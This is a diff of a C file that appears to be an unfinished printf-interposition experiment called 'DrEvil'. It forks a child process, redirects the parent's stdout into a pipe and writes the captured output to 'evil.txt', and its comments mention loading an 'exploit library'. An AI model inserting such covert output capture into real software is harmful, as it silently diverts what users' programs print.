@@ -74,6 +74,10 @@ void evilPrintf(const char * formatString){
 
 }
 
+void myHandler(int sig){
+    ogPrintf("Parent died\n");
+}
+
 void engageDrEvil(){
     
     if(evilMode){
@@ -94,12 +98,20 @@ void engageDrEvil(){
         mypid = fork();
         if(mypid){
             //we are the evil child
+
+            signal(SIGHUP, myHandler);
+            //chatch parent death
+            prctl(PR_SET_PDEATHSIG, SIGHUP);
+            const char * test = getenv("EVILFILENAME");
+            if(test == NULL){
+
+            }
             char * filename = "evil.txt";
             FILE * out = fopen(filename, "w");
             FILE * in = fdopen(com[0], "r");
 
 
-            const char * test = getenv("PATH");
+            
 
             if(0){
                 //dup2(STDIN, EVILFILENAME);
@@ -111,7 +123,6 @@ void engageDrEvil(){
 
                 //dup2(com[0], out);
                 
-                ogPrintf("Created file\n");
 
             }   
 
@@ -126,6 +137,8 @@ void engageDrEvil(){
                 }
             }
 
+
+
             while(waitpid(normalLib, &status, WNOHANG | WUNTRACED)){
                 if(WIFEXITED(status)){
                     //load exploit librarr
@@ -138,8 +151,6 @@ void engageDrEvil(){
             }
         }else{
             //we are the parent
-
-            ogPrintf("We are the parent\n");
 
             close(com[0]); //closes reading end
             dup2(com[1], 1); //duping output to write pipe;
